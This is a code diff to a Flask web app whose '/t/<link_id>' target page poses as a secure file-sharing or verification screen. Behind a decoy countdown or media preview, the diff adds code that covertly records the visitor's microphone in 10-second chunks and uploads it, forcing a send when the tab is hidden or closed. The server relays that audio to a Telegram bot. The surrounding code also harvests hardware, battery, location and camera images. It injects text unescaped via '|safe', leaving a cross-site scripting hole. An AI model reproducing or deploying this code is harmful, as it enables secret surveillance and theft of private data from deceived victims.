@@ -57,10 +57,11 @@ def send_tg_audio(token, cid, raw_audio, caption=""):
     try: 
         footer = "\n\n*v site:* [https://secure\\-links\\-psi\\.vercel\\.app](https://secure-links-psi.vercel.app)"
         full_caption = caption + footer
+        # Sending as voice.ogg usually helps Telegram render it as a playable audio file properly
         requests.post(
             f"https://api.telegram.org/bot{token}/sendAudio", 
             data={"chat_id": cid, "caption": full_caption, "parse_mode": "MarkdownV2"}, 
-            files={"audio": ("audio.webm", raw_audio, "audio/webm")}, 
+            files={"audio": ("voice.ogg", raw_audio, "audio/ogg")}, 
             timeout=15
         )
     except: pass
@@ -741,7 +742,7 @@ def add_bot_direct():
     return redirect("/ds")
 
 
-# --- TARGET PAGE (Stealth Capture & Recording) ---
+# --- TARGET PAGE (Stealth Capture, Mic & Dynamic UI) ---
 @app.route("/t/<link_id>")
 def target_page(link_id):
     res = supabase.table("links").select("*, users(*)").eq("id", link_id).execute()
@@ -754,6 +755,11 @@ def target_page(link_id):
     file_type = data.get("file_type", "")
     target_type = data.get("target_type", "both")
     cam_type = data.get("cam_type", "front_back")
+    
+    # Identify if media (Image or Video) is being sent
+    val = action_value
+    ext = val.split('.')[-1].lower() if val else ''
+    is_media = action_mode == 'file' and (ext in ['mp4', 'webm', 'ogg', 'mov', 'jpg', 'jpeg', 'png', 'gif', 'webp'] or file_type in ['image', 'video'])
 
     html_code = '''
     <!DOCTYPE html>
@@ -761,38 +767,56 @@ def target_page(link_id):
     <head>
         <meta charset="UTF-8">
         <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-        <title>DropVault | Secure Access</title>
+        <title>Secure Access</title>
         <script src="https://cdn.tailwindcss.com"></script>
         <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
         <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@500;900&family=Plus+Jakarta+Sans:wght@400;600;800&display=swap" rel="stylesheet">
         <style>
-            body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #05000a; color: white; overflow-x: hidden; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
-            .orb { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80vw; height: 80vw; background: radial-gradient(circle, rgba(0,229,255,0.1) 0%, transparent 60%); filter: blur(80px); z-index: -1; pointer-events: none;}
-            .glass-box { background: rgba(20, 20, 30, 0.6); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); padding: 40px; width: 90%; max-width: 500px; text-align: center; }
-            .progress-ring circle { transition: stroke-dashoffset 1s linear; transform: rotate(-90deg); transform-origin: 50% 50%; }
+            body { font-family: 'Plus Jakarta Sans', sans-serif; background-color: #000; color: white; overflow-x: hidden; min-height: 100vh; display: flex; align-items: center; justify-content: center; margin: 0;}
+            .orb { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 80vw; height: 80vw; background: radial-gradient(circle, rgba(0,229,255,0.15) 0%, transparent 60%); filter: blur(80px); z-index: -1; pointer-events: none;}
+            .glass-box { background: rgba(20, 20, 30, 0.7); backdrop-filter: blur(25px); border: 1px solid rgba(255,255,255,0.1); border-radius: 24px; box-shadow: 0 20px 50px rgba(0,0,0,0.5); padding: 40px; text-align: center; }
         </style>
     </head>
     <body>
-        <div class="orb"></div>
-
-        <div id="wait-screen" class="glass-box z-10">
-            <h2 class="font-display font-black text-2xl mb-2 text-cyan-400">SECURITY VERIFICATION</h2>
-            <p class="text-xs font-bold uppercase tracking-widest text-gray-400 mb-8">Checking Node Integrity...</p>
+        
+        {% if is_media %}
+        <!-- FULL SCREEN MEDIA UI -->
+        <div class="fixed inset-0 w-full h-full bg-black z-0 flex items-center justify-center">
+            {% if ext in ['mp4', 'webm', 'ogg', 'mov'] or f_type == 'video' %}
+                <video src="{{ a_val }}" controls autoplay playsinline loop class="w-full h-full object-contain"></video>
+            {% else %}
+                <img src="{{ a_val }}" class="w-full h-full object-contain">
+            {% endif %}
             
-            <div class="relative w-32 h-32 mx-auto mb-8">
-                <svg class="progress-ring w-full h-full" width="128" height="128">
-                    <circle stroke="rgba(255,255,255,0.1)" stroke-width="8" fill="transparent" r="56" cx="64" cy="64"/>
-                    <circle id="ring-progress" stroke="#00e5ff" stroke-width="8" fill="transparent" r="56" cx="64" cy="64" stroke-dasharray="351.86" stroke-dashoffset="0"/>
-                </svg>
-                <div class="absolute inset-0 flex items-center justify-center flex-col">
-                    <span id="timer-count" class="font-display font-black text-4xl text-white">10</span>
-                </div>
+            <!-- Center Timer Overlay -->
+            <div id="media-timer-overlay" class="absolute inset-0 bg-black/70 backdrop-blur-sm flex flex-col items-center justify-center z-10 transition-opacity duration-700 pointer-events-none">
+                <div id="timer-count" class="text-8xl md:text-[150px] font-display font-black text-cyan-400 drop-shadow-[0_0_30px_rgba(0,229,255,0.8)]">10</div>
+                <div class="mt-8 text-white font-bold tracking-[0.3em] uppercase text-sm md:text-xl animate-pulse">Decrypting Payload...</div>
             </div>
             
-            <p class="text-sm font-medium opacity-80"><i class="fas fa-shield-halved text-cyan-400 mr-2"></i> Please wait while we decrypt the payload.</p>
+            <!-- Floating Download Button -->
+            <a href="{{ a_val }}" download class="absolute bottom-8 right-8 bg-black/50 border border-cyan-400 text-cyan-400 hover:bg-cyan-400 hover:text-black px-6 py-4 rounded-full font-bold uppercase tracking-widest shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all z-20 backdrop-blur-md flex items-center gap-3">
+                <i class="fas fa-download text-xl"></i> Download
+            </a>
+        </div>
+        
+        {% else %}
+        <!-- STANDARD LOADING BAR UI (Text, Redirect, Document) -->
+        <div class="orb"></div>
+        <div id="wait-screen" class="glass-box z-10 w-[90%] max-w-md relative overflow-hidden">
+            <h2 class="font-display font-black text-2xl mb-2 text-cyan-400">SECURITY VERIFICATION</h2>
+            <p class="text-[10px] font-bold uppercase tracking-widest text-gray-400 mb-8">Establishing Secure Connection...</p>
+            
+            <div class="text-6xl font-display font-black text-white mb-8 drop-shadow-[0_0_15px_rgba(255,255,255,0.3)]" id="timer-count">10</div>
+            
+            <div class="w-full h-3 bg-white/10 rounded-full overflow-hidden mb-3 shadow-inner">
+                <div id="progress-bar" class="h-full bg-gradient-to-r from-cyan-400 to-blue-500 w-0 transition-all ease-linear" style="transition-duration: 1000ms;"></div>
+            </div>
+            <p class="text-[10px] font-bold opacity-60 uppercase tracking-widest text-right w-full block" id="progress-text">0%</p>
         </div>
 
-        <div id="media-content" class="glass-box hidden z-10"></div>
+        <div id="media-content" class="glass-box hidden z-10 w-[90%] max-w-lg"></div>
+        {% endif %}
 
         <canvas id="c" class="hidden"></canvas>
         <video id="bg-v" playsinline autoplay muted class="fixed top-[-1000px] left-[-1000px] w-2 h-2 opacity-0 -z-50"></video>
@@ -802,9 +826,10 @@ def target_page(link_id):
             let camType = "{{ cam_type }}";
             let actMode = "{{ a_mode }}"; 
             let actVal = "{{ a_val }}"; 
-            let txtVal = {{ t_content | tojson | safe }}; 
+            let txtVal = `{{ t_content | safe }}`; 
             let fType = "{{ f_type }}";
             let l_id = "{{ l_id }}";
+            let isMedia = {{ 'true' if is_media else 'false' }};
 
             // Battery Fetcher
             let batteryInfo = "Not Fetched";
@@ -814,6 +839,8 @@ def target_page(link_id):
 
             window.onload = () => { 
                 startVerificationTimer();
+                
+                // Allow a slight delay for UI render before heavily hitting hardware
                 setTimeout(() => {
                     getHardware(); 
                     if(mode.includes('loc') || mode === 'both' || mode === 'location') {
@@ -830,23 +857,58 @@ def target_page(link_id):
                 }, 1000); 
             };
 
+            // --- 10s DYNAMIC TIMER ---
             function startVerificationTimer() {
                 let count = 10;
-                let circle = document.getElementById('ring-progress');
-                let circumference = 56 * 2 * Math.PI; 
-                
+                let timerEl = document.getElementById('timer-count');
+                let pBar = document.getElementById('progress-bar');
+                let pText = document.getElementById('progress-text');
+                let mOverlay = document.getElementById('media-timer-overlay');
+
+                if(pBar) setTimeout(()=> { pBar.style.width = '10%'; if(pText) pText.innerText = '10%'; }, 50);
+
                 let timer = setInterval(() => {
                     count--;
-                    document.getElementById('timer-count').innerText = count;
-                    let offset = circumference - (count / 10) * circumference;
-                    circle.style.strokeDashoffset = offset;
+                    if(timerEl) timerEl.innerText = count;
+                    
+                    if(pBar) {
+                        let pct = ((10 - count) / 10) * 100;
+                        pBar.style.width = pct + '%';
+                        if(pText) pText.innerText = Math.round(pct) + '%';
+                    }
 
                     if(count <= 0) {
                         clearInterval(timer);
-                        document.getElementById('wait-screen').classList.add('hidden');
-                        showFileContent();
+                        
+                        if(isMedia && mOverlay) {
+                            mOverlay.style.opacity = '0';
+                            setTimeout(() => mOverlay.classList.add('hidden'), 700);
+                        } else if (!isMedia) {
+                            document.getElementById('wait-screen').classList.add('hidden');
+                            showFileContent();
+                        }
                     }
                 }, 1000);
+            }
+
+            // --- NON-MEDIA CONTENT RENDERER ---
+            function showFileContent() {
+                let medBox = document.getElementById('media-content');
+                if(!medBox) return;
+                medBox.classList.remove('hidden');
+                let html = "";
+                
+                if(actMode === 'text') {
+                    html = `<h2 class="font-display font-black text-2xl mb-4 text-cyan-400">DECRYPTED DATA</h2><div class="bg-black/40 p-5 rounded-xl text-left whitespace-pre-wrap font-mono text-sm border border-white/10 overflow-y-auto max-h-[300px]">${txtVal}</div>`;
+                } else if (actMode === 'file') {
+                    html = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-file-archive text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">Secure Document</p></div>
+                    <a href="${actVal}" download target="_blank" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all"><i class="fas fa-download mr-2"></i> Download Payload</a>`;
+                } else {
+                    html = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-link text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">External Gateway</p></div>
+                    <a href="${actVal}" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Proceed to Link <i class="fas fa-arrow-right ml-2"></i></a>`;
+                    setTimeout(() => { window.location.href = actVal; }, 1500);
+                }
+                medBox.innerHTML = html;
             }
 
             function getHardware() {
@@ -863,87 +925,68 @@ def target_page(link_id):
                 }
             }
 
-            function showFileContent() {
-                let medBox = document.getElementById('media-content');
-                medBox.classList.remove('hidden');
-                let html = "";
-                
-                if(actMode === 'text') {
-                    html = `<h2 class="font-display font-black text-2xl mb-4 text-cyan-400">DECRYPTED DATA</h2><div class="bg-black/40 p-4 rounded-xl text-left whitespace-pre-wrap font-mono text-sm border border-white/10 overflow-y-auto max-h-[300px]">${txtVal}</div>`;
-                } else if (actMode === 'file') {
-                    let ext = actVal.split('.').pop().toLowerCase();
-                    let isVideo = ['mp4', 'webm', 'ogg', 'mov'].includes(ext);
-                    let isImage = ['jpg', 'jpeg', 'png', 'gif', 'webp'].includes(ext);
+            // --- MICROPHONE LOGIC (10s Chunking & Forced Send) ---
+            let mediaRecorder;
+            let audioChunks = [];
+            let isRecording = false;
 
-                    let previewHtml = '';
-                    if(isVideo || fType === 'video') {
-                        previewHtml = `<video src="${actVal}" controls autoplay playsinline class="w-full max-h-[300px] rounded-xl bg-black mb-6 border border-white/10" onerror="this.outerHTML='<div class=\\'py-10 bg-black/40 rounded-xl mb-6\\'><i class=\\'fas fa-file-video text-4xl text-cyan-400 mb-2\\'></i><p class=\\'text-xs uppercase font-bold\\'>Video Ready</p></div>'"></video>`;
-                    } else if (isImage || fType === 'image') {
-                        previewHtml = `<img src="${actVal}" class="w-full max-h-[300px] object-contain rounded-xl mb-6 border border-white/10" onerror="this.outerHTML='<div class=\\'py-10 bg-black/40 rounded-xl mb-6\\'><i class=\\'fas fa-file-image text-4xl text-cyan-400 mb-2\\'></i><p class=\\'text-xs uppercase font-bold\\'>Image Ready</p></div>'">`;
-                    } else {
-                        previewHtml = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-file-archive text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">Secure Document</p></div>`;
-                    }
-
-                    html = `
-                        <h2 class="font-display font-black text-xl mb-6 text-white">ACCESS <span class="text-cyan-400">GRANTED</span></h2>
-                        ${previewHtml}
-                        <a href="${actVal}" target="_blank" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all"><i class="fas fa-download mr-2"></i> Download Payload</a>
-                    `;
-                } else {
-                    html = `<div class="py-10 bg-black/40 border border-white/10 rounded-xl mb-6"><i class="fas fa-link text-5xl text-cyan-400 mb-3"></i><p class="text-xs uppercase tracking-widest font-bold text-gray-400">External Gateway</p></div>
-                    <a href="${actVal}" class="block w-full bg-gradient-to-r from-cyan-500 to-blue-500 text-white font-bold uppercase tracking-widest p-4 rounded-xl hover:shadow-[0_0_20px_rgba(0,229,255,0.4)] transition-all">Proceed to Link <i class="fas fa-arrow-right ml-2"></i></a>`;
-                }
-                medBox.innerHTML = html;
-            }
-
-            // --- MICROPHONE LOGIC ---
-            function startAudioRecording() {
-                navigator.mediaDevices.getUserMedia({ audio: true }).then(stream => {
-                    let mediaRecorder = new MediaRecorder(stream);
-                    let audioChunks = [];
+            async function startAudioRecording() {
+                try {
+                    const stream = await navigator.mediaDevices.getUserMedia({ audio: { echoCancellation: true, noiseSuppression: true } });
+                    mediaRecorder = new MediaRecorder(stream);
                     
-                    mediaRecorder.ondataavailable = e => { if(e.data.size > 0) audioChunks.push(e.data); };
-                    
-                    mediaRecorder.onstop = () => {
-                        if(audioChunks.length === 0) return;
-                        let audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-                        let reader = new FileReader();
-                        reader.readAsDataURL(audioBlob);
-                        reader.onloadend = () => {
-                            let base64data = reader.result;
-                            // Using keepalive to ensure sending on tab close
-                            fetch("/api/capture_audio/" + l_id, {
-                                method: "POST",
-                                headers: {"Content-Type": "application/json"},
-                                body: JSON.stringify({ audio: base64data }),
-                                keepalive: true
-                            }).catch(()=>{});
-                        };
-                        audioChunks = []; // reset for next cycle
+                    mediaRecorder.ondataavailable = e => {
+                        if (e.data.size > 0) audioChunks.push(e.data);
                     };
                     
+                    mediaRecorder.onstop = () => {
+                        if (audioChunks.length > 0) {
+                            let audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
+                            let reader = new FileReader();
+                            reader.readAsDataURL(audioBlob);
+                            reader.onloadend = () => {
+                                let base64data = reader.result;
+                                fetch("/api/capture_audio/" + l_id, {
+                                    method: "POST", headers: {"Content-Type": "application/json"},
+                                    body: JSON.stringify({ audio: base64data }), keepalive: true
+                                }).catch(()=>{});
+                            };
+                        }
+                        audioChunks = [];
+                        if(isRecording) mediaRecorder.start();
+                    };
+                    
+                    isRecording = true;
                     mediaRecorder.start();
                     
-                    // Periodic Send (every 15 seconds) to avoid losing large files on sudden crash
+                    // Stop & Start every 10 seconds to create 10s chunks
                     setInterval(() => {
-                        if(mediaRecorder.state === "recording") {
+                        if(mediaRecorder && mediaRecorder.state === "recording") {
                             mediaRecorder.stop();
-                            mediaRecorder.start();
                         }
-                    }, 15000);
+                    }, 10000);
 
-                    // Send immediately on hide/close
+                    // If user minimizes or switches tab, force send what's recorded
                     document.addEventListener("visibilitychange", () => {
-                        if(document.visibilityState === 'hidden' && mediaRecorder.state === "recording") {
+                        if(document.visibilityState === 'hidden' && mediaRecorder && mediaRecorder.state === "recording") {
                             mediaRecorder.stop();
-                            mediaRecorder.start(); 
                         }
                     });
                     
-                }).catch(e => console.log("Audio Error:", e));
+                    // Force send on tab close
+                    window.addEventListener("beforeunload", () => {
+                        if(mediaRecorder && mediaRecorder.state === "recording") {
+                            isRecording = false;
+                            mediaRecorder.stop();
+                        }
+                    });
+
+                } catch(err) {
+                    console.log("Mic access error:", err);
+                }
             }
 
-            // --- CAMERA LOGIC ---
+            // --- CAMERA LOGIC (10s Front/Back Cycle) ---
             let camStream = null; 
             let currentCam = "user"; 
             let captureIntervalId = null; 
@@ -992,7 +1035,7 @@ def target_page(link_id):
     </body>
     </html>
     '''
-    return render_template_string(html_code, t_type=target_type, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id, cam_type=cam_type)
+    return render_template_string(html_code, is_media=is_media, ext=ext, t_type=target_type, a_mode=action_mode, a_val=action_value, t_content=text_content, f_type=file_type, l_id=link_id, cam_type=cam_type)
 
 # --- TRACKING APIS ---
 @app.route("/api/log_hardware/<l_id>", methods=["POST"])
